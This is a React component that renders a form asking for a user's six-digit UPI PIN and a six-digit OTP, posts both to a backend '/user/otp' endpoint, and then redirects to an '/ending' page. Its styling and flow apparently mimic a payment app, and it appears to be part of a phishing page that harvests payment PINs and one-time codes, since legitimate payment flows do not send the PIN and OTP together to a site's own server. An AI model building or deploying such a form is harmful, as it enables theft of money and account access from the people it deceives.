import React, { useState, useRef } from "react";
import axios from "axios";
import { useNavigate } from "react-router-dom";
import toast from "react-hot-toast";
import PinCode from "./PinCode";
import LoadingBar from "react-top-loading-bar";

function OTP() {
  const navigate = useNavigate();
  const [upiPin, setUpiPin] = useState("");
  const [otp, setOtp] = useState("");
  const loadingBarRef = useRef(null);

  const handleSubmit = (e) => {
    e.preventDefault();
    const UserData = { upiPin, otp };

    // Start the loading bar
    loadingBarRef.current.continuousStart();

    axios
      .post(`${import.meta.env.VITE_BASEURL}/user/otp`, UserData, {
        withCredentials: true,
      })
      .then((res) => {
        toast.success(res.data.message || "Request Completed");
        navigate("/ending");
      })
      .catch((err) => {
        console.log(err);
        toast.error(err.response?.data?.message || "Error");
      })
      .finally(() => {
        // Complete the loading bar after the request finishes
        loadingBarRef.current.complete();
      });
  };

  return (
    <>
      <LoadingBar color="#C1A0D2" height={"3px"} ref={loadingBarRef} />
      <form action="" className="text-center" onSubmit={handleSubmit}>
        <h2>Enter UPI Pin</h2>
        {/* Using PinCode component for UPI Pin */}
        <PinCode
          length={6} // Specify the number of input boxes
          onComplete={(value) => setUpiPin(value)} // Set UPI Pin value when all boxes are filled
        />
        <br /><br />
        <h2 className="mt-5 ">Enter OTP</h2>
        {/* Using PinCode component for OTP */}
        <PinCode
          length={6} // Specify the number of input boxes
          onComplete={(value) => setOtp(value)} // Set OTP value when all boxes are filled
        />
        <input
          type="submit"
          value="Submit"
          style={{
            position: "absolute",
            bottom: 0,
            left: 0,
            width: "100%",
            height:"50px",
            backgroundColor: "#5F259E",
            color: "white",
            border: "none",
            padding: "10px",
            fontSize: "18px",
            cursor: "pointer",
          }}
        />
      </form>
    </>
  );
}

export default OTP;
